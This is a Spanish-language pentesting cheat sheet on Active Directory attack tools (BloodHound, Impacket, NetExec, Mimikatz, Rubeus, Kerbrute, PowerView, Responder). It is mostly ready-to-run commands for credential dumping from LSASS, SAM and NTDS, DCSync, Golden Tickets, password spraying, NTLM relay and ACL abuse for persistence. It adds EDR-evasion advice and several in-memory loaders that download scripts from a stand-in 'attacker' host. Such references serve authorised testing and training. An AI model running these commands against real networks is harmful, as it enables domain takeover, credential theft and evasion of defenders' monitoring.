---
icon: windows
---

# Tools

## Herramientas de Active Directory

### Flujo de trabajo recomendado

El pentesting de AD sigue una progresión lógica donde cada herramienta tiene su momento óptimo. Usarlas en el orden correcto evita hacer ruido innecesario y maximiza la información obtenida en cada fase.

```
FASE 1 — Sin credenciales
Responder + Kerbrute → capturar hashes y enumerar usuarios válidos

FASE 2 — Primera cuenta de dominio obtenida
BloodHound/SharpHound → mapear el dominio completo
NetExec → verificar acceso y enumerar en masa
PowerView → enumeración detallada de ACLs y objetos

FASE 3 — Explotación
Impacket → Kerberoasting, AS-REP Roasting, secretsdump
Rubeus → ataques Kerberos desde Windows
NetExec → movimiento lateral y ejecución remota en masa

FASE 4 — Domain Admin obtenido
Impacket secretsdump → dump completo de NTDS
Mimikatz / Rubeus → Golden Ticket, DCSync
PowerView → añadir permisos para persistencia
```

#### Consideraciones OPSEC

En entornos con EDR o monitorización activa, algunas herramientas generan más ruido que otras:

| Acción               | Ruidoso                           | Silencioso                        |
| -------------------- | --------------------------------- | --------------------------------- |
| Ejecución remota     | `psexec` (crea servicio en disco) | `wmiexec` (solo logs WMI)         |
| Dump de credenciales | Mimikatz en disco                 | `lsassy`, `nanodump`, nxc `--lsa` |
| Tickets Kerberos     | RC4 (0x17 — alertas frecuentes)   | AES256 (0x12 — menos detectable)  |
| Enumeración AD       | LDAP queries masivas              | BloodHound con `--stealth`        |

```bash
# Preferir AES256 sobre RC4 en tickets Kerberos
.\Rubeus.exe asktgt /user:usuario /aes256:AES_HASH /opsec /ptt

# lsassy — dump de LSASS sin escribir mimikatz en disco
pip3 install lsassy
lsassy -u usuario -p contraseña 10.10.10.10

# Invoke-Mimikatz — cargar en memoria sin tocarlo en disco
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

> El flujo más eficiente: **BloodHound** para mapear el dominio → **NetExec** para verificar accesos y ejecutar en masa → **Impacket** para explotar desde Linux → **Mimikatz/Rubeus** para ataques Kerberos desde Windows.

> Mantener siempre actualizados **Impacket** y **NetExec** — añaden nuevas técnicas y módulos constantemente.

### BloodHound

BloodHound es la herramienta más importante para análisis de AD. Recopila datos del dominio y los representa como un **grafo de relaciones** que permite encontrar rutas de ataque hacia Domain Admin que serían invisibles analizando los datos manualmente.

#### SharpHound — recopilación de datos

```powershell
# Recopilación completa
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Solo datos del DC (más rápido, menos ruido)
.\SharpHound.exe -c DCOnly --zipfilename dc_data.zip

# Stealth — evitar consultas ruidosas
.\SharpHound.exe -c All --stealth --zipfilename data.zip

# En memoria (sin tocar disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -ZipFileName data.zip
```

```bash
# bloodhound-python desde Linux (no requiere acceso Windows)
pip3 install bloodhound
bloodhound-python -u usuario -p contraseña -d empresa.local -ns 10.10.10.10 -c All --zip
```

#### Queries predefinidas más útiles

Una vez importados los datos en BloodHound (File → Import → subir el ZIP):

* **Find Shortest Paths to Domain Admins** — la más importante, ruta más corta desde cualquier nodo a DA
* **Find Principals with DCSync Rights** — cuentas con derechos de replicación
* **Find Computers with Unconstrained Delegation** — equipos vulnerables
* **Find AS-REP Roastable Users** — usuarios sin preautenticación
* **Find Kerberoastable Users** — usuarios con SPN configurado
* **Shortest Path from Owned Principals** — marcar nodos comprometidos (clic derecho → Mark as Owned) y buscar el camino desde ahí

#### Queries Cypher personalizadas

```cypher
-- Usuarios con GenericAll sobre Domain Admins
MATCH p=(u:User)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"}) RETURN p

-- Todos los paths desde un usuario comprometido hacia DA
MATCH p=shortestPath((u:User {name:"USUARIO@EMPRESA.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@EMPRESA.LOCAL"})) RETURN p

-- Cuentas con contraseña que no expira
MATCH (u:User {passwordneverexpires:true, enabled:true}) RETURN u.name
```

### Impacket

Suite de herramientas en Python para interactuar con protocolos de red Windows. Indispensable para pentesting de AD desde Linux.

| Herramienta               | Uso principal                           |
| ------------------------- | --------------------------------------- |
| `impacket-psexec`         | Shell remota via SMB (como SYSTEM)      |
| `impacket-wmiexec`        | Shell remota via WMI (más sigilosa)     |
| `impacket-smbexec`        | Shell remota SMB sin subir binarios     |
| `impacket-secretsdump`    | Dump de SAM, NTDS, LSA y hashes         |
| `impacket-GetUserSPNs`    | Kerberoasting                           |
| `impacket-GetNPUsers`     | AS-REP Roasting                         |
| `impacket-ticketer`       | Crear Golden/Silver Tickets             |
| `impacket-ntlmrelayx`     | NTLM Relay hacia SMB, LDAP, HTTP        |
| `impacket-findDelegation` | Encontrar cuentas con delegación        |
| `impacket-getTGT`         | Obtener TGT como archivo .ccache        |
| `impacket-getST`          | Obtener Service Ticket (S4U2Self/Proxy) |
| `impacket-addcomputer`    | Añadir cuenta de equipo al dominio      |

```bash
# Instalar
pip3 install impacket

# Distintas formas de autenticación
impacket-secretsdump empresa.local/usuario:contraseña@10.10.10.10          # contraseña
impacket-secretsdump empresa.local/Admin@10.10.10.10 -hashes :NTLM_HASH    # PtH
export KRB5CCNAME=ticket.ccache
impacket-secretsdump -k -no-pass empresa.local/Admin@dc01.empresa.local    # ticket
```

### NetExec (nxc)

Sucesor de CrackMapExec. Permite ejecutar acciones en masa sobre toda una red con una sola línea. Referencia para verificación de credenciales, enumeración y post-explotación.

```bash
# Protocolos disponibles
nxc smb 192.168.1.0/24 -u usuario -p contraseña        # SMB
nxc ldap 10.10.10.10 -u usuario -p contraseña --users  # LDAP
nxc winrm 10.10.10.10 -u usuario -p contraseña         # WinRM
nxc rdp 10.10.10.10 -u usuario -p contraseña           # RDP

# Enumeración
nxc smb 10.10.10.10 -u usuario -p contraseña --shares
nxc smb 10.10.10.10 -u usuario -p contraseña --pass-pol
nxc ldap 10.10.10.10 -u usuario -p contraseña --asreproast asrep.txt
nxc ldap 10.10.10.10 -u usuario -p contraseña --kerberoasting kerb.txt

# Post-explotación
nxc smb 10.10.10.10 -u usuario -p contraseña --sam
nxc smb 10.10.10.10 -u usuario -p contraseña --lsa
nxc smb 10.10.10.10 -u usuario -p contraseña --ntds
nxc smb 10.10.10.10 -u usuario -p contraseña -x "whoami"

# Módulos
nxc smb 10.10.10.10 -u usuario -p contraseña -M gpp_password
nxc smb 10.10.10.10 -u usuario -p contraseña -M lsassy
nxc smb 10.10.10.10 -u usuario -p contraseña -M spider_plus
nxc ldap 10.10.10.10 -u usuario -p contraseña -M get-desc-users

# Password spraying
nxc smb 10.10.10.10 -u usuarios.txt -p "Password123!" --continue-on-success
```

### Mimikatz

La herramienta de referencia para extracción de credenciales de la memoria de Windows. Opera principalmente sobre LSASS.

```powershell
# Siempre ejecutar primero
privilege::debug
token::elevate

# Dump de credenciales
sekurlsa::logonpasswords         # credenciales de todas las sesiones
sekurlsa::wdigest                # contraseñas en texto claro (Windows antiguo)
sekurlsa::tickets                # tickets Kerberos en memoria
sekurlsa::ekeys                  # claves Kerberos AES

# SAM y LSA
lsadump::sam
lsadump::secrets
lsadump::cache                   # Domain Cached Credentials

# DCSync
lsadump::dcsync /user:krbtgt /domain:empresa.local
lsadump::dcsync /all /domain:empresa.local

# Tickets Kerberos
kerberos::list /export           # exportar todos como .kirbi
kerberos::ptt ticket.kirbi       # inyectar ticket
kerberos::purge

# Golden Ticket
kerberos::golden /user:Administrator /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX /krbtgt:KRBTGT_HASH /ptt

# Sin escribir en disco
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"' -ComputerName dc01
```

### Rubeus

Herramienta en C# para operaciones Kerberos. Más moderna que Mimikatz para este propósito y con más opciones OPSEC.

```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt     # solo RC4
.\Rubeus.exe kerberoast /user:sqlsvc /outfile:hashes.txt

# AS-REP Roasting
.\Rubeus.exe asreproast /outfile:hashes.txt

# Solicitar TGT
.\Rubeus.exe asktgt /user:usuario /password:contraseña /domain:empresa.local /ptt
.\Rubeus.exe asktgt /user:usuario /rc4:NTLM_HASH /domain:empresa.local /ptt
.\Rubeus.exe asktgt /user:usuario /aes256:AES_HASH /domain:empresa.local /opsec /ptt

# Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:empresa.local \
    /sid:S-1-5-21-XXX-XXX-XXX /user:FakeAdmin /groups:512,518,519 /ptt

# S4U — Constrained Delegation y RBCD
.\Rubeus.exe s4u /user:sqlsvc /rc4:NTLM_HASH /impersonateuser:Administrator \
    /msdsspn:"cifs/target.empresa.local" /ptt

# Monitorizar tickets entrantes (Unconstrained Delegation)
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Gestión de tickets
.\Rubeus.exe triage
.\Rubeus.exe dump
.\Rubeus.exe ptt /ticket:BASE64_TICKET
.\Rubeus.exe purge
```

### Kerbrute

Herramienta en Go para enumeración y spraying via Kerberos. Más sigilosa que las alternativas SMB porque genera Event ID `4768` (AS-REQ) en lugar de `4625` (logon fallido).

```bash
# Enumerar usuarios válidos
kerbrute userenum --dc 10.10.10.10 -d empresa.local usernames.txt -o validos.txt

# Password spraying
kerbrute passwordspray --dc 10.10.10.10 -d empresa.local validos.txt "Password123!"

# Brute force de un usuario específico
kerbrute bruteuser --dc 10.10.10.10 -d empresa.local rockyou.txt administrador

# Con múltiples hilos
kerbrute userenum --dc 10.10.10.10 -d empresa.local usernames.txt -t 50
```

***

### PowerView

Módulo de PowerShell del framework PowerSploit para enumeración completa de AD. La herramienta de referencia para enumeración manual detallada, especialmente ACLs y rutas de ataque.

```powershell
# Cargar en memoria (sin tocar disco)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
```

#### Enumeración del dominio

```powershell
Get-Domain
Get-DomainController | Select Name, IPAddress
(Get-DomainPolicy)."SystemAccess"     # política de contraseñas
Get-DomainTrust                        # trusts con otros dominios
Get-ForestTrust
```

#### Usuarios

```powershell
Get-DomainUser | Select samaccountname, description, memberof, admincount

# Usuarios con contraseña en la descripción (muy frecuente)
Get-DomainUser | Where-Object {$_.description -ne $null} | Select samaccountname, description

# Cuentas de alto valor
Get-DomainUser -AdminCount                           # protegidas por AdminSDHolder
Get-DomainUser -SPN                                  # Kerberoastables
Get-DomainUser -UACFilter DONT_REQ_PREAUTH           # AS-REP Roastables
Get-DomainUser -UACFilter PASSWORD_NEVER_EXPIRES
```

#### Grupos y equipos

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainGroup -MemberIdentity "usuario"

Get-DomainComputer -Unconstrained                    # Unconstrained Delegation
Get-DomainComputer -TrustedToAuth -Properties dnshostname,msds-allowedtodelegateto
Find-LocalAdminAccess -Verbose                       # dónde somos admin local
```

#### Localización de usuarios activos

```powershell
Find-DomainUserLocation -GroupName "Domain Admins"
Get-NetLoggedon -ComputerName WS01.empresa.local
Get-NetSession -ComputerName dc01.empresa.local
```

#### ACLs — el uso más importante de PowerView

```powershell
# Buscar ACLs abusables en todo el dominio
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner|GenericWrite|ForceChangePassword|AddMember" -and
    $_.IdentityReferenceName -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Administrators"
} | Select ObjectDN, ActiveDirectoryRights, IdentityReferenceName | Format-List

# ACLs sobre un objeto concreto
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll|Write|ForceChangePassword"
}

# Permisos de DCSync sobre el objeto del dominio
Get-ObjectAcl -DistinguishedName "DC=empresa,DC=local" -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "DS-Replication"
} | Select IdentityReference, ObjectAceType
```

#### Explotación directa

```powershell
# Resetear contraseña (GenericAll o ForceChangePassword)
Set-DomainUserPassword -Identity victima -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Añadir a un grupo (GenericAll o AddMember)
Add-DomainGroupMember -Identity "Domain Admins" -Members "usuario_controlado"

# Targeted Kerberoasting — asignar SPN (GenericWrite)
Set-DomainObject -Identity victima -Set @{serviceprincipalname='fake/spn'}
Get-DomainSPNTicket -SPN "fake/spn" -OutputFormat Hashcat

# Dar derechos DCSync (WriteDACL sobre el dominio)
Add-DomainObjectAcl -TargetIdentity "DC=empresa,DC=local" `
    -PrincipalIdentity "usuario_controlado" -Rights DCSync -Verbose

# Hacerse propietario y darse permisos (WriteOwner)
Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity "usuario_controlado"
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "usuario_controlado" -Rights All
```

#### GPOs y shares

```powershell
Get-DomainGPO | Select displayname, gpcfilesyspath
Get-DomainGPO -ComputerName WS01.empresa.local

Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include *.xml,*.ini,*.txt,*.config,*.ps1
```

### Responder

Responder es un envenenador de protocolos de resolución de nombres (LLMNR, NBT-NS, mDNS) que captura hashes NTLMv1/v2. Cuando un equipo intenta resolver un nombre que no existe en DNS, emite una consulta broadcast. Responder intercepta esa consulta, responde diciendo "soy yo", y el equipo víctima intenta autenticarse enviando su hash NTLMv2. No genera tráfico activo hacia los objetivos — solo responde a peticiones que ya se producen.

#### Protocolos que envenena

| Protocolo  | Puerto   | Descripción                                |
| ---------- | -------- | ------------------------------------------ |
| **LLMNR**  | UDP 5355 | Fallback cuando DNS falla en redes locales |
| **NBT-NS** | UDP 137  | NetBIOS Name Service, muy común en Windows |
| **mDNS**   | UDP 5353 | Multicast DNS para resolución local        |
| **WPAD**   | TCP 80   | Web Proxy Auto-Discovery                   |

#### Uso básico

```bash
# Modo análisis — ver qué hay en la red sin responder
sudo responder -I eth0 -A

# Modo activo — capturar hashes
sudo responder -I eth0 -rdwv
# -r  habilitar respuestas NBT-NS
# -d  habilitar respuestas DHCP
# -w  habilitar servidor WPAD
# -v  verbose

# Ver hashes capturados en tiempo real
tail -f /usr/share/responder/logs/Responder-Session.log

# Crackear los hashes
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Responder en modo relay

En lugar de crackear el hash, se puede **retransmitirlo en tiempo real** hacia otro sistema. Más potente porque no depende de la fortaleza de la contraseña.

```bash
# Paso 1: Identificar equipos sin SMB signing
nxc smb 192.168.1.0/24 --gen-relay-list targets_relay.txt

# Paso 2: Deshabilitar HTTP y SMB en Responder
# Editar /usr/share/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# Paso 3: Iniciar Responder
sudo responder -I eth0 -rdwv

# Paso 4: ntlmrelayx retransmite la autenticación capturada
impacket-ntlmrelayx -tf targets_relay.txt -smb2support
# Si el usuario es admin en el target → dump SAM automático

# Con sesión interactiva
impacket-ntlmrelayx -tf targets_relay.txt -smb2support -i
# Conectar a la sesión: nc 127.0.0.1 PUERTO

# Relay hacia LDAP para modificar ACLs o crear cuentas
impacket-ntlmrelayx -t ldap://10.10.10.10 -smb2support --delegate-access
```

#### Configuración de Responder.conf

```ini
[Responder Core]
SMB = On         # cambiar a Off cuando se use ntlmrelayx
HTTP = On        # cambiar a Off cuando se use ntlmrelayx
HTTPS = On
LDAP = On
DNS = On
SQL = On
FTP = On
```

> Responder es más efectivo en redes donde hay equipos Windows que acceden a recursos inexistentes — shares mal configurados, scripts con rutas UNC incorrectas, impresoras... Estos equipos emiten consultas LLMNR/NBT-NS constantemente.

> En redes con **LLMNR y NBT-NS deshabilitados por GPO** (buena práctica defensiva), Responder no capturará nada via esos protocolos. Verificar primero con el modo análisis (`-A`) antes de activar el modo completo.

***

### Referencias

| Recurso                 | URL                                                                                                                          |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| HackTricks AD           | https://book.hacktricks.xyz/windows-hardening/active-directory-methodology                                                   |
| PayloadsAllTheThings AD | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md |
| ired.team               | https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse                                         |
| BloodHound docs         | https://bloodhound.readthedocs.io                                                                                            |
| Impacket ejemplos       | https://github.com/fortra/impacket/tree/master/examples                                                                      |
| TarLogic Kerberos guide | https://www.tarlogic.com/blog/how-kerberos-authentication-works/                                                             |
| AD Security blog        | https://adsecurity.org                                                                                                       |
| Harmj0y blog            | https://blog.harmj0y.net                                                                                                     |
